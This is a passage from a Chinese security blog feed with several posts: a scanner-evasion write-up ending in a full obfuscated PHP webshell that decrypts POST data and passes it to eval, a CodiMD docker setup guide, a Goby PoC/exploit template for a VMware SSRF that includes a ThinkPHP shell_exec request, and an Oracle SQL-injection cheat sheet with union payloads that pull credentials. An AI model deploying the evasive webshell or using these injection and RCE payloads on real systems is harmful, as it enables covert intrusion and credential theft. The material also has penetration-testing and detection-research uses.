class="hljs-keyword">if</span>(!extension_loaded(strrev(<span class="hljs-string">&#x27;lssnepo&#x27;</span>)))<br><br><span class="hljs-number">3.</span><br><span class="hljs-symbol">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br>修改为<br><span class="hljs-symbol">$t</span>=strrev(<span class="hljs-string">&quot;edoced_46esab&quot;</span>);<br></code></pre></td></tr></table></figure><p>此时没了这些特征关键字，D盾只能识别为二级可疑了</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_bypass/php_02.png"></p><p>然后处理第三处特征</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$post[$i] = $post[$i]^$key[$i+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>将其拆开增加一个变量赋值过程，并将后面的15提前定义为变量，最后将异或的两个参数逆序,最终得到如下webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@error_reporting(<span class="hljs-number">0</span>);<br>session_start();<br>    <span class="hljs-variable">$kkk</span>=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$kkk</span>;<br><span class="hljs-variable">$post</span>=(strrev(<span class="hljs-string">&quot;stnetnoc_teg_elif&quot;</span>))(strrev(<span class="hljs-string">&quot;tupni//:php&quot;</span>));<br><span class="hljs-variable">$num</span>=<span class="hljs-number">15</span>;<br><span class="hljs-keyword">if</span>(!extension_loaded(strrev(<span class="hljs-string">&#x27;lssnepo&#x27;</span>)))<br>&#123;<br><span class="hljs-variable">$t</span>=strrev(<span class="hljs-string">&quot;edoced_46esab&quot;</span>);<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$temp</span>= <span class="hljs-variable">$kkk</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-variable">$num</span>]^<span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]; <br><span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] =<span class="hljs-variable">$temp</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=openssl_decrypt(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$kkk</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=explode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>@<span class="hljs-keyword">new</span> C(<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>此时D盾已经无法检测（2021年3月）</p><p>最新D盾仍然可以报其二级可疑（2021年5月）</p>]]></content>
    
    
    <categories>
      
      <category>bypass</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>codimd在线协作文档部署</title>
    <link href="/2021/05/09/codimd%E5%9C%A8%E7%BA%BF%E5%8D%8F%E4%BD%9C%E6%96%87%E6%A1%A3%E9%83%A8%E7%BD%B2/"/>
    <url>/2021/05/09/codimd%E5%9C%A8%E7%BA%BF%E5%8D%8F%E4%BD%9C%E6%96%87%E6%A1%A3%E9%83%A8%E7%BD%B2/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>codimd是一款在线的markdown编辑器，用于实时在线协作编辑，非常适合需要多人合作记录重点信息的情况。</p><h2 id="安装部署"><a href="#安装部署" class="headerlink" title="安装部署"></a>安装部署</h2><p>github地址</p><p><a href="https://github.com/hackmdio/codimd">https://github.com/hackmdio/codimd</a></p><p>官方文档介绍了多种部署方式，其中docker部署最为快捷，本文介绍此场景下部署codimd的流程。</p><h3 id="安装docker和docker-compose"><a href="#安装docker和docker-compose" class="headerlink" title="安装docker和docker-compose"></a>安装docker和docker-compose</h3><p>1.安装https协议、CA证书、dirmngr</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> update<br>apt-<span class="hljs-builtin-name">get</span> install -y apt-transport-https ca-certificates<br>apt-<span class="hljs-builtin-name">get</span> install dirmngr<br></code></pre></td></tr></table></figure><p>2.添加GPG密钥并添加更新源</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -fsSL https:<span class="hljs-regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="hljs-regexp">/docker-ce/</span>linux<span class="hljs-regexp">/debian/g</span>pg | sudo apt-key add -<br>echo <span class="hljs-string">&#x27;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27;</span> | sudo tee <span class="hljs-regexp">/etc/</span>apt<span class="hljs-regexp">/sources.list.d/</span>docker.list<br></code></pre></td></tr></table></figure><p>3.系统更新以及安装docker</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span><br>apt install docker-<span class="hljs-keyword">ce</span><br></code></pre></td></tr></table></figure><p>4.启动docker服务器</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">service docker <span class="hljs-literal">start</span>\<br></code></pre></td></tr></table></figure><p>5.安装compose</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> docker-compose<br></code></pre></td></tr></table></figure><h3 id="部署codimd"><a href="#部署codimd" class="headerlink" title="部署codimd"></a>部署codimd</h3><p>之前的老教程多数会使用本地的数据库，最新的docker部署方式已经不需要自己创建数据库，可拉取一个postgreSQL数据库镜像作为替代</p><p>我们只需要创建并编辑一个docker-compose.yml</p><p>将以下三项与后面数据库配置CMD_DB_URL的参数对应起来即可</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">POSTGRES_USER</span>=codimd<br><span class="hljs-attr">POSTGRES_PASSWORD</span>=change_password<br><span class="hljs-attr">POSTGRES_DB</span>=codimd<br></code></pre></td></tr></table></figure><p>完整的docker-compose.yml文档</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">version:</span> <span class="hljs-string">&quot;3&quot;</span><br><span class="hljs-symbol">services:</span><br><span class="hljs-symbol">  database:</span><br><span class="hljs-symbol">    image:</span> postgres:<span class="hljs-number">11.6</span>-alpine<br><span class="hljs-symbol">    environment:</span><br>      - POSTGRES_USER=codimd<br>      - POSTGRES_PASSWORD=change_password<br>      - POSTGRES_DB=codimd<br><span class="hljs-symbol">    volumes:</span><br>      - <span class="hljs-string">&quot;database-data:/var/lib/postgresql/data&quot;</span><br><span class="hljs-symbol">    restart:</span> always<br><span class="hljs-symbol">  codimd:</span><br><span class="hljs-symbol">    image:</span> hackmdio/hackmd:<span class="hljs-number">2.3</span><span class="hljs-number">.2</span><br><span class="hljs-symbol">    environment:</span><br>      - CMD_DB_URL=postgres:<span class="hljs-comment">//codimd:change_password@database/codimd</span><br>      - CMD_USECDN=false<br><span class="hljs-symbol">    depends_on:</span><br>      - database<br><span class="hljs-symbol">    ports:</span><br>      - <span class="hljs-string">&quot;3000:3000&quot;</span><br><span class="hljs-symbol">    volumes:</span><br>      - upload-data:<span class="hljs-meta-keyword">/home/</span>hackmd<span class="hljs-meta-keyword">/app/</span>public/uploads<br><span class="hljs-symbol">    restart:</span> always<br><span class="hljs-symbol">volumes:</span><br>  database-data: &#123;&#125;<br>  upload-data: &#123;&#125;<br></code></pre></td></tr></table></figure><p>接着运行docker-compose up -d</p><p>等待镜像拉取完毕并运行，使用以下命令查看运行状态</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> logs -f -t --tail <span class="hljs-number">10</span>  codimd_codimd_<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>如发现如下日志，表示已正常监听到3000端口</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/codimd/codimd_01.png"></p><p>使用浏览器能正常访问，得到如下界面，说明部署成功。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/codimd/codimd_02.png"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>点击登录位置随便输入账号密码进行注册</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/codimd/codimd_03.png"></p><p>然后登录，创建新文档，会生成一个随机的url，本页面可使用markdown语法进行编辑。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/codimd/codimd_04.png"></p><p>需要合作编辑时，只需要将url发给合作者，对方注册后即可共同编辑，在完成所有工作后也可以导出此文档。</p><p>最后记得停止docker容器.</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/codimd/codimd_05.png"></p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p>官方文档：<br><a href="https://hackmd.io/c/codimd-documentation/%2Fs%2Fcodimd-docker-deployment">https://hackmd.io/c/codimd-documentation/%2Fs%2Fcodimd-docker-deployment</a></p><p>docker、docker-compose相关安装：<br><a href="https://zhuanlan.zhihu.com/p/82361096">https://zhuanlan.zhihu.com/p/82361096</a></p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>goby编写自定义poc</title>
    <link href="/2021/05/07/goby%E7%BC%96%E5%86%99%E8%87%AA%E5%AE%9A%E4%B9%89poc/"/>
    <url>/2021/05/07/goby%E7%BC%96%E5%86%99%E8%87%AA%E5%AE%9A%E4%B9%89poc/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>goby是一款攻击面分析工具，同时拥有资产扫描、资产识别和漏洞扫描能力，安装简单，直接解压即可使用，界面也非常友好，内置了大量由官方和其他网络安全从业者提供的poc。</p><p>官网： <a href="https://gobies.org/">https://gobies.org/</a></p><p>帮助goby提交poc积攒到一定数量可以获取功能更强大的hvv红队专版，本文以CVE-2021-21975 VMware vRealize Operations Manager SSRF为例记录一下goby-poc的编写过程。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>1.去poc群获取最新版本goby</p><p>2.在已有poc列表中确认自己要写的poc和别人没有重复</p><h2 id="编写流程"><a href="#编写流程" class="headerlink" title="编写流程"></a>编写流程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>打开最新版goby，点击Vulnerability页面中的PoC Management</p><p>点击右上角的+POC新增POC</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/goby_poc/goby_01.png"></p><p>本界面主要要填写漏洞的基本信息以及检测条件。</p><p>基本信息包括漏洞名称、威胁等级、漏洞类型、描述、影响、作者、产品地址等，一般我们写漏洞预警或者提交其他漏洞的时候都对这些很熟悉了，就不在赘述了，根据官方文档中的规范来填写即可。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/goby_poc/goby_02.png"></p><p>比较需要注意的一点是检测条件，它代表着goby识别到某种资产，才会使用此poc进行验证，所以要根据右边问号的提示尽量的精确识别出资产，才能保证poc在使用的时候确实被触发。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/goby_poc/goby_03.png"></p><p>填写完之后点击test选项卡，填写漏洞探测相关的参数，如果有多个请求可以点击加号新增，可以根据实际情况选择and和or条件</p><p>在每一个请求中，Request中需要填写请求类型、url路径、header、以及Post Data。</p><p>根据漏洞本身探测的报文，按照下图格式填写就行</p><p>如VMware vRealize Operations Manager SSRF的探测</p><p>需要往/casa/nodes/thumbprints路径post一条json数据，json数据中使用其本机443端口的ui页面作为探测目标，即填写[“127.0.0.1:443/ui”]</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/goby_poc/goby_04.png"></p><p>Response中需要填写判断漏洞存在的条件，如http响应状态、http头、Body中包含的关键文本等都可以作为判断依据。</p><p>在本例中需要同时满足http响应状态为200，且响应body中包含vRealize Operations Manager关键字，则如下填写</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/goby_poc/goby_05.png"></p><p>随后就可以保存并使用右上角的单ip探测功能尝试自己的poc是否有效（目前不支持https，如果遇到https的情况，可以将其先保存，然后在PoC Management界面导入此poc，然后直接扫描存在此漏洞的站点对poc进行测试）</p><p>此时poc的部分完成了，可以在PoC Management<br>中import进来，然后测试一下是否可以检测出漏洞</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/goby_poc/goby_06.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>goby还有Verify功能，我们需要增加exp部分才可以在扫描到漏洞之后直接用goby验证，但是这部分没法在gui编写，所以需要了解以下格式。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&quot;HasExp&quot;</span>: true<span class="hljs-regexp">//</span> 是否录入 Exp，如有 Exp，Goby 在扫描到漏洞后会展现出 verify 按钮用以执行 Exp 验证漏洞<br><span class="hljs-string">&quot;ExpParams&quot;</span>: [<span class="hljs-regexp">//</span> 前端需要传递给 Exp 的参数，如要执行的命令<br>    &#123;<br>        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-regexp">//</span> 参数的名称<br>        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;input&quot;</span>,<span class="hljs-regexp">//</span> 参数输入类型，input 表示需要用户输入，select 表示 Exp 可以提供默认列表让用户进行选择输入内容<br>        <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;whoami&quot;</span><span class="hljs-regexp">//</span> 参数的值<br>    &#125;<br>]<br><span class="hljs-string">&quot;ExploitSteps&quot;</span>: [<br>    <span class="hljs-string">&quot;AND&quot;</span>,<br>    &#123;<br>        <span class="hljs-string">&quot;Request&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;GET&quot;</span>,<br>            <span class="hljs-string">&quot;uri&quot;</span>: <span class="hljs-string">&quot;/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=shell_exec&amp;vars[1][]=&#123;&#123;&#123;cmd&#125;&#125;&#125;&quot;</span>,<span class="hljs-regexp">//</span> 通过 &#123;&#123;&#123;参数名称&#125;&#125;&#125; 引用前端传递过来的值<br>            <span class="hljs-string">&quot;follow_redirect&quot;</span>: true,<br>            <span class="hljs-string">&quot;header&quot;</span>: &#123;&#125;,<br>            <span class="hljs-string">&quot;data_type&quot;</span>: <span class="hljs-string">&quot;text&quot;</span>,<br>            <span class="hljs-string">&quot;data&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;SetVariable&quot;</span>: [<span class="hljs-string">&quot;output|lastbody&quot;</span>]<span class="hljs-regexp">//</span> 将响应的 HTTP Body 打印出来，展示命令执行效果<br>    &#125;<br>]<br></code></pre></td></tr></table></figure><p>在本例ssrf中，我们需要修改post数据中的ip:port/url部分，所以做如下更改</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs d"> <span class="hljs-string">&quot;HasExp&quot;</span>: <span class="hljs-literal">true</span>,<br> <span class="hljs-string">&quot;ExpParams&quot;</span>: [<br>           &#123;<br>                 <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;url&quot;</span>,<br>                 <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;input&quot;</span>,<br>                 <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;127.0.0.1:443/ui&quot;</span><br>           &#125;<br>     ]，<br> <span class="hljs-string">&quot;ExploitSteps&quot;</span>: [<br><span class="hljs-string">&quot;AND&quot;</span>,<br>&#123;<br>  <span class="hljs-string">&quot;Request&quot;</span>: &#123;<br><span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br><span class="hljs-string">&quot;uri&quot;</span>: <span class="hljs-string">&quot;/casa/nodes/thumbprints,</span><br><span class="hljs-string">&quot;</span>follow_redirect<span class="hljs-string">&quot;: true,</span><br><span class="hljs-string">&quot;</span>heade<span class="hljs-string">r&quot;: &#123;</span><br><span class="hljs-string">&quot;</span>Content-Type<span class="hljs-string">&quot;: &quot;</span>application/json;charset=UTF-<span class="hljs-number">8</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">&#125;,</span><br><span class="hljs-string">&quot;d</span>ata_type<span class="hljs-string">&quot;: &quot;</span>text<span class="hljs-string">&quot;,</span><br><span class="hljs-string">&quot;d</span>ata<span class="hljs-string">&quot;: &quot;</span>[\<span class="hljs-string">&quot;&#123;&#123;&#123;url&#125;&#125;&#125;\&quot;]&quot;</span><br>  &#125;,<br>  <span class="hljs-string">&quot;SetVariable&quot;</span>: [<span class="hljs-string">&quot;output|lastbody&quot;</span>]<br>&#125;<br> ],<br></code></pre></td></tr></table></figure><p>我们可以将Editor选项卡中对应的项替换修改，也可以打开goby解压目录的golib\exploits\user寻找刚才保存的文件进行修改，保存之后就可以使用了</p><p>使用对方本地测试</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/goby_poc/goby_07.png"></p><p>使用dnslog测试</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/goby_poc/goby_08.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>goby官方的poc教程<br><a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide">https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide</a></p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>oracle数据库注入</title>
    <link href="/2021/05/06/oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/05/06/oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>过去渗透遇到oracle注入都是使用工具去跑的，这几天看到相关的文章就想起自己对oracle数据库手工注入的知识点还有所欠缺，本文做次简单的笔记整理</p><h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">connect</span> <span class="hljs-comment">--连接角色，基本角色</span><br>resource <span class="hljs-comment">--开发者角色</span><br>dba <span class="hljs-comment">--超级管理员角色</span><br></code></pre></td></tr></table></figure><h2 id="注入时常用命令"><a href="#注入时常用命令" class="headerlink" title="注入时常用命令"></a>注入时常用命令</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查询用户名<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual;<br>获取当前数据库名<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> global_name;<br>查询版本信息<br><span class="hljs-keyword">select</span> banner <span class="hljs-keyword">from</span> v$<span class="hljs-keyword">version</span>;<br>获取当前用户权限<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> session_privs;<br>获取当前用户所拥有权限下的所有数据库<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> <span class="hljs-keyword">owner</span>,<span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> all_tables;<br>获取指定表的字段（注意这里的<span class="hljs-built_in">table_name</span>全部大写）<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> all_tab_columns <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;USERS&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="注入时常用的函数和拼接符"><a href="#注入时常用的函数和拼接符" class="headerlink" title="注入时常用的函数和拼接符"></a>注入时常用的函数和拼接符</h2><p>dual 是Oracle中的虚表，任何用户均可读取，常用在没有目标表的select 语句中</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">字符串拼接<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;123&#x27;</span>||<span class="hljs-string">&#x27;456&#x27;</span> <span class="hljs-keyword">from</span> dual;<br>分页（等效<span class="hljs-keyword">limit</span>）<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> rownum=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> rownum&lt;<span class="hljs-number">2</span>;<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> rownum&lt;=<span class="hljs-number">1</span>;<br>注释符<br><span class="hljs-comment">--</span><br><span class="hljs-comment">-- -</span><br><span class="hljs-comment">--空格</span><br><span class="hljs-comment">/**/</span><br>实现mysql的group_concat（以波浪号为分隔符连接多个<span class="hljs-built_in">column_name</span>）<br><span class="hljs-keyword">select</span> listagg(<span class="hljs-built_in">column_name</span>,<span class="hljs-string">&#x27;~&#x27;</span>) <span class="hljs-keyword">within</span> <span class="hljs-keyword">group</span> (<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> user_tab_columns;<br></code></pre></td></tr></table></figure><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">格式<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> dual;<br><br>获取表名<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,(<span class="hljs-keyword">select</span> listagg(<span class="hljs-built_in">table_name</span>,<span class="hljs-string">&#x27;~&#x27;</span>) <span class="hljs-keyword">within</span> <span class="hljs-keyword">group</span>(<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> all_tables <span class="hljs-keyword">where</span> owner=<span class="hljs-string">&#x27;SQLI&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br><br>获取指定表的字段名<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,(<span class="hljs-keyword">select</span> listagg(<span class="hljs-built_in">column_name</span>,<span class="hljs-string">&#x27;:&#x27;</span>) <span class="hljs-keyword">within</span> <span class="hljs-keyword">group</span>(<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> all_tab_columns <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;USERS&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br><br>获取指定字段内容<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,(<span class="hljs-keyword">select</span> listagg(uname||<span class="hljs-string">&#x27;&amp;&#x27;</span>||pwd,<span class="hljs-string">&#x27;:&#x27;</span>) <span class="hljs-keyword">within</span> <span class="hljs-keyword">group</span>(<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> rownum=<span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span 